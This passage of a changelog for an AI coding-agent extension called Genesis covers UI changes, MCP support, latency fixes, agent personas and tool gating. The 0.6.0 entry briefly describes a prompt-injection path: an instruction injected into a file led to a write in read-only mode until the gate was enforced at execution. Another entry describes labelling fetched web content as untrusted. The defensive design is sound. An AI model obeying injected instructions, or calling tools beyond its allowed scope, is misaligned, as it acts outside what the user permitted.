  model reading a fragment is told so. Its own watcher, so an edit reaches the
  next turn rather than the next window.
- **Web search without a browser.** `web_search` for the questions that do not
  need a page opened. DuckDuckGo by default and needs no key; Brave, Google and
  Bing take `genesis.searchApiKey`, which accepts `${env:}` and `${file:}` so
  it need not sit in settings in the clear.
- **Untrusted-content marking.** Anything fetched from the internet reaches the
  model wrapped and labelled, so a page attempting to issue instructions is read
  as a page that says so rather than as an instruction.
- **Browser actions and vision.** Click and type by ref, read a page as prose
  with its images described, and a window to watch it work in
  (`genesis.browserHeaded`, `genesis.browserProfile`).
- **Background streaming across conversation switches.** A turn now carries its
  own abort, its own replay buffer and a reference to the transcript it appends
  to. Switching conversations mid-stream moves what is on screen and nothing
  else; the answer keeps being written to the conversation that asked for it.

### Changed
- **Ask is one predicate, read twice.** Both lines of work had built Ask
  independently. The surviving gate is read where tools are offered and again
  where a call executes, because filtering the advertised array is a request to
  the model rather than a guarantee about it. The agent gate rides on the same
  predicate, so the two cannot disagree.
- **The approval control moved onto the composer's control row**, beside the
  phase and the model. Those three answer one question between them: what it may
  do, which model does it, and whether it will ask first.
- **The panel opens in the Secondary Side Bar** by manifest contribution rather
  than by moving the whole Primary Side Bar across the window. Upgrading from
  0.5.4 or earlier undoes that move once and then never touches the layout.
- **The empty screen offers the conversations that exist**, not three invented
  examples naming code no workspace has.

### Fixed
- **A screenshot cost ~157,000 tokens instead of ~1,400**, a photo page was sent
  as a 1.2 MB png, and alt text never reached the model at all.
- **`controlCenter.js` took down the whole pane** on an unguarded
  `sv.tools.length`.

## 0.7.0

Agents: a persona plus a list of what it may reach, enforced at the boundary
where a call runs rather than advertised in the tools array. Alongside them,
three chat-surface changes: long questions stop burying the answer, a
conversation can leave the extension as a file, and the panel says what the
agent is doing to the workspace while it does it.

### Added
- **Long questions collapse.** A pasted stack trace or a three-screen brief is
  still the user's own words and none of it can be summarised away, but at full
  height one turn pushes the answer it is asking about off the panel, and
  scrolling back past it is the price of every later glance at the
  conversation. Past 420 characters or 7 lines a user turn renders clamped
  under a fade with its own `Show all N lines` expander; the text is never
  altered, only how much of it is on screen. Two thresholds because either
  alone is wrong: 40 short lines is a wall of text well under the character
  count, and one 900-character paragraph wraps to a wall of text on a single
  line. Restored transcripts clamp the same way, since both paths build the
  turn through one function.
- **Export the chat as JSON.** Transcripts live one-file-per-conversation in a
  private storage directory, which is the right shape for the extension and the
  wrong shape for a person: there was no way to hand a conversation to a
  colleague, attach it to a bug report, or feed it to a script. Two new
  commands - `Genesis: Export chat as JSON` and `Export all chats as JSON` -
  two rows in the header's overflow menu, and `/export` in the composer, all
  write one readable document through a save dialog. The conversation the
  composer is writing into is taken from the controller rather than from disk,
  so a turn still in flight and a chat not yet persisted both export what is on
  screen. The confirmation lands in the transcript with an `Open` button rather
  than in a toast that takes the path away with it.
- **A live changed-file panel.** `fileTouched` reached the frontend and hit an
  empty `case` - the panel knew a file had changed and did nothing with it.
  There is now one row per file above the composer, revealed on the first
  write, flashing on each subsequent one, with the running `+`/`-` per file and
  in total; a row opens the file, and the panel can be cleared without touching
  anything on disk. The list is conversation-scoped rather than turn-scoped: it
  answers "what has this chat done to my workspace", which a list that emptied
  at every turn boundary could not. It survives a webview reload through the
  turn replay buffer and a window reload through `stateSync`.
- **Line counts, while the turn is still running.** `write_file` and
  `edit_file` now report what they did through `onFileTouched`, measured by
  `lineStat` (`src/agent/tools.ts`): common leading and trailing lines are
  trimmed and what remains is counted, which is exact for a single contiguous
  edit and an overestimate for scattered ones. The panel marks those numbers
  with a `~` until the end of the turn, when the shadow repository's `numstat`
  replaces this turn's estimate with git's own count and the tilde goes. The
  estimate is subtracted rather than the total overwritten, so a file changed
  in an earlier turn keeps the count it earned there.
- **Agents.** A persona plus a list of what it may reach, one Markdown file
  each in `.agent/agents/`: a model override, a memory file, an allowlist of
  built-in tools, an allowlist of skills, and a per-server filter over MCP
  tools. The `mcp:` block takes Hermes Agent's own shape
  (`tools.include` / `tools.exclude`, `*` globs) so a filter can be copied
  between the two, plus the shorthands people write first - `mcp: "*"`,
  `mcp: none`, `mcp: [filesystem, memory]`, `mcp: { filesystem: [read_*] }`.
  Everything except `name` is optional and every omission means "unrestricted"
  rather than "none", so an agent can start as a persona and acquire limits
  later. Pick one with `/agent`, from the Agents section of the Diagnostics
  tab, or from the command palette; a bar under the tabs names the active one
  and states its scope, and nothing is drawn when none is selected.
- **The agent scope is enforced, not advertised.** One predicate,
  `agentAllowsMcp` / `agentAllowsTool` (`src/agents/loader.ts`), read at the
  boundary where tools are offered *and* at the boundary where a call runs -
  the same rule the read-only phases follow, for the same reason: filtering the
  `tools` array is a request to the model, not a guarantee about it. An agent
  whose picker row promises "read_text_file only" and whose runtime runs
  `write_file` would be worse than no agent at all. `test/agent-gate.ts` drives
  the real loop with a model that deliberately calls tools it was never
  offered; `test/mcp-live.ts` proves the same scope against a real MCP server
  process, where the write tool is connected and callable without the agent and
  refused with it.
- **Agent memory.** `memory:` names a workspace file that is read into the
  system prompt on every turn, with the instruction that the agent may rewrite
  it using its own tools. No machinery behind it, which is the point: what
  accumulates is a file that can be read, edited and deleted. Capped at 8k
  characters, refused if the path leaves the workspace.
- **A way back from the empty screen.** New chat used to land on a welcome
  message whose only route back was the history popover in the header - two
  clicks and a menu, to return to the thing you were reading a second ago. The
  empty screen now lists the last few conversations under the starting-point
  chips. Nothing renders on a first run, so the message stands alone.
- **`Open in editor` on file tool cards.** A card about a file could not reach
  it. The header cannot carry the link - it is itself the button that expands
  the card, and a control inside a control is neither valid nor operable by
  keyboard - so the action lives in the body it opens, on `read_file`,
  `write_file` and `edit_file`, and not on a call that failed.

### Changed
- **The footer strip is gone.** A row under the composer carried the context
  figure, its meter and the endpoint pill: three facts that are status rather
  than controls, costing a row of vertical space on every panel in a sidebar
  whose scarcest resource is vertical space. The figure and the meter moved
  into the header beside the wordmark, and the endpoint's health became a dot
  on the model button, which already names that endpoint's model. Nothing was
  dropped: the figure still prints only when the gateway reported real usage,
  the meter still turns amber then coral, and the dot still turns red on a TLS
  failure.

### Fixed
- **A message steered mid-turn kept its text and lost its files.** The steering
  path built `{ role: "user", content: text }` by hand while the normal send
  path composed images into content blocks and inlined text files as fenced
  blocks. A screenshot pasted during a running turn reached the model as the
  sentence about it - and the composer had already cleared the pill, so nothing
  on screen said it was gone. Both paths now go through one
  `composeUserMessage`, and the acknowledgement carries the file chips so the
  transcript shows what is waiting. The queue path was already correct; its
  note now shows the chips too.

## 0.6.0

Ask joins Plan and Act, a second live MCP example, and small chat-surface polish.

### Added
- **Ask mode.** A third composer segment, in the palette's new amber
  (`--kx-ask`), next to Plan (violet) and Act (turquoise). Ask offers the same
  grounding as Plan - `read_file`, `list_files`, `glob`, `search`,
  `read_skill` - but never `update_todos` and never ends in a plan card: it
  exists to answer a direct question against the real workspace, not to
  produce a design or a build order. Shift+Tab now cycles Ask → Plan → Act →
  Ask instead of toggling two states, and the read-only banner above the
  transcript generalises to both restricted phases instead of naming Plan
  alone.
- `ASK_ONLY` (`src/agent/loop.ts`), the tool set for ask phase, and
  `ASK_ADDENDUM`, its system-prompt addition - short, and deliberately silent
  about steps or plans, so a model cannot mistake it for Plan's contract.
  `READ_ONLY` is now `ASK_ONLY` plus `update_todos` rather than a second
  hand-maintained list, so the two cannot drift apart.
- **A second MCP example.** `.agent/mcp.json` now ships `memory`
  (`@modelcontextprotocol/server-memory`) alongside `filesystem` - a local
  knowledge graph rather than another file reader, so the shipped config
  demonstrates a stateful tool, not just a second passthrough. Nothing it does
  touches the workspace: its graph lives next to the installed package unless
  `MEMORY_FILE_PATH` says otherwise. `test/mcp-live.ts` spawns it for real,
  same as `filesystem`, and round-trips a `create_entities` / `search_nodes`
  call rather than only checking that it starts.

### Fixed
- **The read-only phases are now enforced, not just advertised.** Filtering the
  `tools` array is a request to the model, not a guarantee about it: a gateway
  that drops the array, a small model echoing a `write_file` shape from earlier
  in the transcript, or an instruction injected into a file the model just
  read, all produce a call for a tool that was never offered - and the loop
  handed that name straight to `runTool`. A write in Ask mode landed. The phase
  policy now lives in one predicate, `toolAllowedIn` (`src/agent/loop.ts`),
  read at both the advertisement boundary and the execution boundary, so the
  two cannot disagree. A refused call comes back as a tool result naming the
  phase that *can* run it, so the turn continues instead of dying.
  MCP tools are refused outside Act by prefix rather than by lookup - a server
  that names a tool `read_file` does not walk through the gate on its suffix.
- **The MCP client no longer advertises a capability it does not implement.**
  `CLIENT_CAPABILITIES` claimed `sampling`, which invites the server to send
  `sampling/createMessage`; every server-initiated request was answered with
  `-32601`. A server that trusted the advertisement got a hard protocol error
  at the moment it tried to use the feature. Dropped from both the stdio and
  HTTP transports; nothing consumed it here either.
- An unknown phase reaching the webview left the composer with no segment lit
  and no banner - a state the user could not name or escape except by
  clicking. It normalises to Act, matching the host's own default, rather than
  to Ask: showing a read-only badge over a session the host would still run a
  write in is the flattering answer and the wrong one. The host normalises
  `setPhase` the same way and echoes the corrected value back.
- A restored transcript showed settled tool cards with a green tick beside a
  grey "still running" rail dot, the two marks contradicting each other on the
  same row.

### Added
- **`roots/list` is now implemented** rather than refused. A server asking
  where the workspace is gets a real answer - the directory it was started in,
  as a `file://` URI built with `pathToFileURL` so a Windows drive letter
  survives. Previously the one capability the client legitimately advertised
  was still answered "method not found". Remote servers get an empty list,
  which is the truth: they do not share this machine's filesystem.
- **`test/mcp-script.ts`: an MCP server that is not an npm package.** Every
  other MCP suite started something through `npx`, which quietly made "works
  with MCP" mean "works with the two npm packages we ship as examples". This
  one writes a dependency-free Python server to a temp file and drives it
  through the real registry, so the transport is what is under test rather
  than somebody's SDK. It also has the server call `roots/list` back mid
  `tools/call` - the only coverage of a server-initiated request against a
  live registry, and the thing that proves the fix above rather than assuming
  it. Skips cleanly where no Python 3 exists; on Windows it prefers `python`,
  because `python3` there is a Store alias that launches nothing.
- The config template gains a `script-server` example (disabled, like the
  others) and says plainly that `command` need not be `npx`. Two footguns are
  documented at the point they bite: the script path must be absolute, since
  `cwd` is the workspace and a relative path breaks when a different folder is
  opened, and the interpreter must be named rather than relying on a shebang,
  which Windows does not consult at all.
- Command cards label their two halves `IN` and `OUT`. The header truncates a
  command to fit the panel, so the full line had nowhere to live; "what did it
  actually run" is also the first question on a failure, and the error path
  used to skip the argument preview entirely. Both the live path and session
  restore build the same shape.
- A status rail down the left of the transcript - one dot per tool row, grey
  running, turquoise done, burgundy failed. A column read at one x-position
  scans faster than a ragged right edge set by each row's argument length.

### Changed
- The phase control is a `radiogroup` with `aria-checked` rather than three
  plain buttons styled by a data attribute. A screen reader announced three
  equal buttons and never which phase was live - the one thing the control
  exists to say. The active segment also gains a 2px underline in its own hue,
  so the state does not rest on colour alone.
- `PHASES` is now the definition and `Phase` is derived from it, so a fourth
  phase cannot enter the type without also becoming something the host can
  validate at runtime. `src/ui/protocol.ts` re-exports it instead of keeping a
  second hand-maintained copy.
- Approval mode's own `"ask"` (confirm every mutating call) and phase's new
  `"ask"` (a phase with no mutating calls to confirm) are different axes and
  never interact - Ask phase offers nothing `approvalMode` would ever gate.
  Documented at the point both are read, not only here.
- The composer placeholder splits three ways: "Ask Genesis anything…" now
  belongs to Ask, where it always literally applied; Act gets "Tell Genesis
  what to do…" instead of inheriting Ask's old text.
- The idle-verb pool gains `ASK_VERBS` ("Reading up…", "Following the
  trail…", …), so a waiting Ask turn reads differently from a waiting Act
  turn rather than falling back to the generic set.
- `.agent/mcp.json` and the scaffold template in `src/core/app.ts` both now
  say MCP tools are withheld in Ask mode too, not Plan alone.

## 0.5.0

Latency work — connection reuse, prompt caching, and getting disk, git, and
JSON serialisation off the path between Enter and the first token. Plus a
diagnostics fix for gateways that hang on non-streaming requests.

### Fixed
- **Diagnostics hung for two minutes on NVIDIA NIM.** The Completion rung sends
  a non-streaming request, which that gateway does not answer at all over
  HTTP/1.1. The streaming fallback and its warning already existed, but the
  probe waited out the full 120s production timeout before reaching them, with
  the panel showing only "Running…". The probe is now bounded to 20s and aborts
  rather than being abandoned, so the fallback and its explanation appear
  almost immediately.
- **A reply that arrived in one frame did not type out.** How a response is
  chunked is the gateway's choice; some send the whole answer in a single SSE
  frame. Painting on arrival made those land as one block. Display is now paced
  from a buffer, so a reply types regardless of how it arrives, and the end of
  a turn always reveals whatever is left.
- **A disabled MCP server was invisible.** `enabled: false` caused the registry
  to drop the server entirely, so the panel showed "No MCP servers configured"
  and offered to create a config file the user had just edited. Disabled
  servers are now a state: listed, greyed, not counted as failures, with a note
  saying how to turn them on.
- **Multi-byte characters corrupted mid-stream.** The SSE reader decoded each
  chunk independently, so a UTF-8 sequence spanning a TCP segment boundary
  became U+FFFD — any reply with emoji or CJK broke at random points. Now
  decoded through a streaming `TextDecoder`.
- **Interrupt did not abort the request**, only the reading of it, so a cancel
  during a long pause before the first token had no effect until the next chunk
  arrived. The signal now reaches `undici.request`.
- **Anthropic tool results were sent one message each.** The wire expects every
  `tool_result` for a turn in a single user message; splitting them teaches a
  model that can call in parallel to stop. They are now batched.
- `message_start` was ignored, so input and cache token counts never surfaced.
- The diagnostics ladder built four undici dispatchers and closed none.

### Added
- **Prompt caching**, opt-in per profile via `capabilities.promptCaching`
  (`anthropic` | `prefix` | `none`, default `none`) and `capabilities.cacheTtl`.
- **Warm-up on composer focus** — connection, credential, and the cacheable
  head of the prompt are paid for while the user is still typing.
- **Per-turn timings in the log**: headers, TTFT, TPOT, total, and a cumulative
  handshake count. A count that climbs once per turn means connection reuse is
  broken; it is the first thing to check.
- `usage.cacheRead` / `usage.cacheWrite`, the only honest confirmation caching
  is working.
- CI: `npm test` / `npm run verify`, a declared `jsdom` devDependency, and a
  GitHub Actions matrix (Node 20/22 × Ubuntu/Windows) that also uploads a
  packaged `.vsix`. Live-API and MCP-server suites are excluded from CI and
  have their own `test:live` / `test:mcp` scripts.

### Changed
- **Idle sockets are pooled for 60s, not undici's default 4s.** A turn is
  separated from the next by however long a person takes to read and type, so
  every turn was paying a fresh TCP connect, TLS handshake, and — on the
  endpoints this extension exists for — a CONNECT tunnel and an mTLS exchange.
- TLS material is parsed once into a shared `SecureContext` instead of handing
  ~150 root PEMs to every handshake.
- **Skill edits no longer tear down the transport.** Profiles and skills are
  watched separately; saving a `SKILL.md` mid-conversation used to destroy the
  connection pool.
- Transcripts are written asynchronously behind an in-memory metadata index.
  `list()` and `nextUntitled()` each used to read and parse every transcript on
  disk, and `list()` runs on every save.
- The turn checkpoint no longer blocks the request: it starts immediately and
  is joined at the approval gate, which every mutating tool passes through.
- Token counts are memoised per message rather than recomputed each iteration.
- Auth resolution overlaps request encoding rather than preceding it.
- A request that fails on a stale pooled socket, before reaching the server, is
  replayed once on a fresh one.

## 0.4.0

Bundled skills, Act button in brand green, and a Control Center fix.

### Fixed
- **Control Center crashed on open since 0.3.0.** Two bugs:
  (1) The stroke shorthand `SW` used by every icon in `controlCenter.js` was
  never declared — it was called `S6` in the sidebar, and the CC copy was never
  updated when the crystal refactor renamed it. Every icon `<path>` threw a
  `ReferenceError` at parse time, which killed the IIFE before `mount()`.
  (2) In a VS Code webview, `<script src>` tags can race: `controlCenter.js`
  read `window.__kxCrystal` synchronously at init, but `crystal.js` sometimes
  hadn't finished loading yet. Both surface scripts now poll for readiness
  before running, so load order cannot break them.
- Defensive guards added to `renderStrip` and section renderers for missing
  `tls.ca`, `proxy.noProxy`, and `files` arrays on profile DTOs.

### Added
- **All 17 Anthropic skills ship inside the extension.** The `skills/` directory
  at the extension root contains every skill from
  `github.com/anthropics/skills`: algorithmic-art, brand-guidelines,
  canvas-design, claude-api, doc-coauthoring, docx, frontend-design,
  internal-comms, mcp-builder, pdf, pptx, skill-creator, slack-gif-creator,
  theme-factory, web-artifacts-builder, webapp-testing, xlsx. The loader already
  scanned `<extensionPath>/skills/` as a bundled directory; this populates it.
  Workspace skills in `.agent/skills/` still override bundled ones by name.
- `THIRD-PARTY-NOTICES.md` from the Anthropic skills repository.

### Changed
- **Act button is Genesis green.** The Plan / Act segment now reads as
  purple / emerald — `--kx-active` for Plan, `--kx-accent` for Act — matching
  the brand identity. Previously Act used `--vscode-button-secondaryBackground`
  which was a nondescript grey.

## 0.3.1

Composer fixes, file attachments, and UI polish from user testing.

### Fixed
- **Textarea showed a scrollbar when empty.** The overflow was always `auto`;
  now it starts as `hidden` and only switches to `auto` once the content exceeds
  `max-height`. A `min-height: 32px` prevents the input area from collapsing.
- **Textarea shrank below its usable height.** The autoGrow calculation reset
  height to `auto` without a floor, and the scrollbar fought the layout. Both
  are now coordinated: height clamps at 32px–120px and overflow follows.

### Added
- **File attachments.** The paperclip button opens a native file picker (images,
  documents, all files, up to 10 MB). Chosen files appear as removable pills
  above the textarea. Images are sent as base64 content blocks when the profile
  has vision enabled; the client layer already handles both OpenAI and Anthropic
  image wire formats. Attachments clear on send and on session switch.
- **Image rendering in transcripts.** User messages with image content blocks
  render inline thumbnails in the chat bubble, both live and on session restore.

### Changed
- **Aura animation reworked.** Adopted the user's heartbeat timing: a single
  ring snaps outward on each beat rather than orbiting continuously. The swirl
  layer and second staggered ring are removed. The animation is tighter and
  calmer.

## 0.3.0

New brand mark, and a rebuilt session mechanism.

### Fixed
- **New chat did nothing visible.** `newChat` cleared the transcript on the host
  and rotated the session id, but broadcast no message that told the webview to
  clear. The conversation stayed on screen while the host had already moved on.
- **Every message became its own session.** A consequence of the above: because
  the screen never changed after pressing New chat, each subsequent message was
  filed under a freshly rotated id. The history popover filled with one-message
  sessions. Session identity now changes in exactly one place, and every change
  is announced with `sessionSwitched`.
- **Tool calls were never persisted.** The agent loop accumulated assistant and
  tool messages in a local array and dropped it on return; the controller then
  rebuilt history as a lossy `user` / `assistant` pair. The model re-read files
  it had already read, and a restored session could not render its tool cards.
  The loop now reports each message it appends through `onMessage`.
- **A window reload split conversations.** Each extension-host start minted a
  new session id. The active id is persisted in `workspaceState` and the
  transcript is picked back up on activation.
- **The user's message was recorded after the turn, not before.** A webview
  reloading mid-stream re-rendered a transcript that did not contain the
  question it was answering. The user turn is now written before the model is
  called, so a host that dies loses the reply but never the question.

### Added
- History popover shows message counts, marks the active conversation, and has
  a per-row delete. New inbound message `deleteSession`.
- `media/logo.png` — a 128×128 tile, registered as the extension `icon`. The
  manifest previously had none.
- `media/webview/crystal.js` — the brand mark as a single shared asset loaded by
  both surfaces. It used to be a verbatim copy in each webview script.

### Changed
- **New crystal artwork.** A faceted cluster traced from the source logo:
  eighteen facets over four emerald gradients above a dark union silhouette,
  plus three highlight slivers. Portrait 42:48 rather than the old landscape
  48:30, so `crystal(height)` derives the width and no call site can stretch it.
  The silhouette is load-bearing — without it the gaps between facets show the
  host background and the cluster reads as shattered on a light theme.
- **The waiting indicator is a dark-green aura.** Two staggered expanding
  pulses, a masked conic sweep orbiting the mark, a breathing core and a beating
  crystal, all in deep emerald so the aura sits behind the mark rather than
  out-shouting it. `prefers-reduced-motion` still falls back to a static
  crystal.
- The activity-bar icon is a reduced six-shard cluster, thickened so the gaps
  survive VS Code masking it to flat monochrome at 16–24px. The full silhouette
  rendered as a blob.
- Outbound `sessionRestored` is now `sessionSwitched`, and it is emitted for new
  chats and deletions as well as loads.
- `SessionMetaDto` gains `count` and `active`; `StateSync.session` gains
  `title`.

## 0.2.0

First release under the GENESIS name.

### Added
- Sidebar webview: session transcript, tool cards, per-file diff cards, todo
  card, in-chat permission cards, plan phase, slash and `@` quick picks,
  model picker grouped by profile, context meter.
- Control Center editor tab with ten sections covering endpoints, wire formats,
  auth, TLS/mTLS, proxy, diagnostics, agent, skills, checkpoints and logs.
- Plan phase: read-only tool set plus a fenced `plan` block parsed into a card.
- `update_todos` tool backing the todo card.
- Per-file diff accept/reject against the shadow-git snapshot.
- Turn replay so a webview reloaded mid-stream catches up.
- `authCacheReport()` — cache keys and expiries, never tokens.
- `ShadowRepo.numstat`, `restoreFile`, `fileDiff`.
- `EndpointClient.close()`; clients pooled per profile.

### Fixed
- OAuth2 exchange cache used tokens for 30s **after** expiry. The skew is now
  the standard early refresh: stop using the token 30s **before** it expires.

### Changed
- Config namespace is `genesis.*` with five keys.
- Approval modes are `ask | edits-auto | full-auto`.
- Approvals render in the transcript rather than as modal dialogs.
